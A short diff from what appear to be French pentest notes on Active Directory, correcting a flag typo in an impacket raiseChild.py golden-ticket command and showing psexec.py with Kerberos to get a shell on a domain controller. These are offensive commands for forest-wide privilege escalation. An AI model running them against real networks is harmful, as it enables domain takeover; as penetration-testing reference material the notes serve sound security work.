@@ -43,4 +43,4 @@ controler avec klist
 Shell: psexec.py <CHILD_DOMAIN_fqdn>/<3>@<fqdn_dc> -k -no-pass -target-ip <dc_ip>
 
 #Golden ticket avec impacket-raiseChild.py (auto)
-raiseChild.py -arget-exec <dc_ip> <CHILD_Domain_fqdn>/<DOM_ADM_OWNED>
+raiseChild.py -target-exec <dc_ip> <CHILD_Domain_fqdn>/<DOM_ADM_OWNED>
